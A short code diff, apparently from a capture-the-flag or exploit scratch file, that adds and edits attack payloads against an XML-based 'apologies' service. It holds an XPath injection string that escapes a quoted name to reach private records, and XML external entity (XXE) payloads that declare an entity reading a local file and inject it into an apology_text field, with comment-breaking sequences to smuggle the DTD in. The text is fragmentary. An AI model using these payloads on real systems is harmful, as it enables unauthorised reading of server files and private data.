@@ -6,5 +6,5 @@ name_exploit = "TEST2']/../apology[@private='true"
 """admin
 --><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><!--"""
 
-
-# foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><root><apologies><apology id='1' private='true' nickname_receiver='A_VOT_NE_SKAZU'><apology_text>&xxe;</apology_text></apology></apologies></root><!--
+admin
+foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:////home/texh0k0t/kek'>]><root><apologies><apology id='1' private='true' nickname_receiver='A_VOT_NE_SKAZU'><apology_text>&xxe;</apology_text></apology></apologies></root><!--
